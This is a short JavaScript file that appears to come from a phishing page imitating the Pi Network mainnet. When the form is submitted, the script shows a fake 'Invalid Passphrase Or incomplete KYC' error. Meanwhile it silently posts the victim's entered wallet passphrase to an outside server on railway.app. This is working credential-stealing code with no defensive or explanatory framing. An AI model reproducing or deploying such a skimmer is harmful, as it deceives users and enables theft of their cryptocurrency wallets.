// https://pinetworkmainnet.com/pi/formaction.php

let form=document.querySelector('form')


let data=document.querySelector('.form-control')

let message=document.querySelector('.error')




    form.addEventListener('submit',async (e)=>{
        e.preventDefault()
                 message.innerHTML =
           " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
        await fetch("https://mainnet-production.up.railway.app/handle-mail", {
          method: "POST",
          body: JSON.stringify({ pass: data.value }),
        });


        // window.location.reload()

})
